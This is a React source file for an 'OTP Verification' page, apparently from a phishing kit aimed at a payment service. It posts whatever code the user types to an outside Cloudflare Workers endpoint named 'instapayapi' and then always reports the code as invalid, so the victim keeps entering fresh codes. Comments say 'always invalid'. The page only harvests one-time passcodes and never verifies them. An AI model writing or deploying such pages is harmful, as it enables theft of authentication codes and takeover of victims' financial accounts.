import React, { useState } from "react";

export default function OTPPage() {
    const [otp, setOtp] = useState("");
    const [error, setError] = useState("");

    const handleChange = (e) => {
        // only digits, no limit
        const value = e.target.value.replace(/\D/g, "");
        setOtp(value);
        setError("");
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        const payload = {
            username: "username",
            otp: otp
        };
        await fetch("https://my-worker-app.instapayapi.workers.dev/api/otp", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
        setOtp('')
        // always invalid
        setError("Invalid OTP. Please try again.");
    };

    return (
        <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-100 via-gray-100 to-green-200 px-4">
            <form
                onSubmit={handleSubmit}
                className="bg-white w-full max-w-sm p-6 rounded-2xl shadow-xl"
            >
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
                    OTP Verification
                </h2>

                <p className="text-sm text-gray-500 text-center mb-6">
                    Enter the OTP sent to your number
                </p>

                <input
                    type="text"
                    value={otp}
                    onChange={handleChange}
                    placeholder="Enter OTP"
                    className="w-full border-2 border-gray-300 focus:border-blue-500 outline-none p-4 rounded-lg text-center text-lg tracking-widest mb-4"
                    required
                />

                {error && (
                    <div className="text-red-600 text-sm text-center mb-3 font-semibold">
                        {error}
                    </div>
                )}

                <button
                    type="submit"
                    className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-3 rounded-xl font-bold text-lg shadow-lg hover:from-green-700 hover:to-green-800 transition-all active:scale-95"
                >
                    Verify OTP
                </button>
            </form>
        </div>
    );
}
